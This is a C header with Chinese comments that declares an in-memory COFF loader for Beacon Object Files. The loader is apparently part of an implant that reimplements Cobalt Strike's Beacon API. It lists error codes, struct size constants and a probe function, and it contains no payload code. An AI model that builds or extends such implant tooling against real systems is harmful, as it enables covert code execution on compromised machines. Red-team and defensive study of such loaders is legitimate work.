/*
 * csdev :: bof.h  --  Beacon Object File (COFF) 内存加载器接口
 * ==========================================================================
 * 把 MSVC 生成的 COFF 目标文件 (.o) 在植入体进程内加载并执行, 并提供与原版
 * Cobalt Strike 对齐的 Beacon API 实现 (见 bof_api.c)。
 *
 * COFF 侧只用 kernel32 的 VirtualAlloc / VirtualProtect / VirtualFree /
 * LoadLibraryA / GetProcAddress —— 不新增任何静态导入。
 * ==========================================================================
 */
#ifndef CSDEV_BOF_H
#define CSDEV_BOF_H

/* 执行一个 COFF: coff/cofflen 为 .o 原始字节, args/argslen 为参数块
 * (BOF 约定: 每参数 = [4B 长度][数据])。输出通过回调写回。
 * 返回 0 成功, 非 0 为错误码。
 *
 * 关于字节序的重要说明:
 *   原版 bof_pack 打包的整数与长度前缀是 **大端(BE)**, 不是小端。
 *   证据链见 bof_api.c 顶部注释。因此 args 必须按 BE 打包, 才能与原版 BOF
 *   生态 (sleeve 目录下的 .o) 二进制兼容。若需要 LE 变体, 定义
 *   BOF_ARGS_LITTLE_ENDIAN=1 重新编译 bof_api.c。 */
int bof_execute(const unsigned char *coff, unsigned int cofflen,
                const unsigned char *args, unsigned int argslen,
                char *out, unsigned int outcap, unsigned int *outlen);

/* ---------------------------------------------------------------- 错误码 */
/* 全部为负值, 0 表示成功。 */
#define BOF_OK               0
#define BOF_ERR_ARG         (-1)   /* 入参非法 (空指针 / 长度为 0)      */
#define BOF_ERR_COFF        (-2)   /* COFF 头或节表结构非法             */
#define BOF_ERR_MACHINE     (-3)   /* 非 AMD64 目标文件 (本实现仅 x64)  */
#define BOF_ERR_NOMEM       (-4)   /* 虚拟内存分配失败                  */
#define BOF_ERR_SYMBOL      (-5)   /* 存在无法解析的外部符号            */
#define BOF_ERR_RELOC       (-6)   /* 不支持的重定位类型                */
#define BOF_ERR_ENTRY       (-7)   /* 未找到入口符号 go / _go           */
#define BOF_ERR_CRASH       (-8)   /* BOF 执行期间触发硬件异常          */
#define BOF_ERR_INTERNAL    (-9)   /* 内部状态错误                      */

/* 结构体大小常量 (COFF 规范, 逐字节解析, 不依赖编译器对齐) */
#define BOF_COFF_HDR_SIZE   20u
#define BOF_SEC_HDR_SIZE    40u
#define BOF_SYM_SIZE        18u
#define BOF_RELOC_SIZE      10u

/* ------------------------------------------------------ 可选: 诊断与探测 */
/* 以下三个不是 beacon2.c 接线所必需的, 供审计/自测工具使用。 */

/* 注册诊断回调。加载器在符号解析失败、重定位类型不支持等场合回报一行
 * 人类可读文本。回调在 bof_execute/bof_probe 内同步调用。 */
typedef void (*bof_diag_fn)(const char *msg);
void bof_set_diag(bof_diag_fn fn);

/* 只解析不执行: 完成 COFF 解析 + 全部符号解析 + 全部重定位计算,
 * 但不调用入口。用于样本批量统计与"哪些外部符号没实现"的清单。
 * 返回 0 表示该 COFF 可被本加载器接受。 */
int bof_probe(const unsigned char *coff, unsigned int cofflen,
              unsigned int *nsec, unsigned int *nrel,
              char *entry, unsigned int entrycap);

#endif /* CSDEV_BOF_H */
